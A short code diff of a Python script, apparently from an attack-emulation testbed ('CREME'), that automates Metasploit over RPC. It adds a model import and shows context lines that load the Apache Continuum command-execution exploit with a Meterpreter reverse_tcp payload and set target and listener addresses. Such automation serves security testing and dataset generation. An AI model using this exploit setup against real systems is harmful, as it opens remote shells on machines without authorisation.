@@ -2,7 +2,7 @@ import time
 import sys
 import os
 from pymetasploit3.msfrpc import MsfRpcClient
-
+from CREMEapplication.models import AttackScenario
 
 def record_timestamp(folder, output_time_file):
     output_time_file = os.path.join(folder, output_time_file)
@@ -42,7 +42,7 @@ def main(argv):
     elif(FS == "apache_continuum_cmd_exec"):
         exploit = client.modules.use('exploit', 'linux/http/apache_continuum_cmd_exec')
         payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
-        
+
     exploit['RHOSTS'] = target_ip
     payload['LHOST'] = my_ip 
 
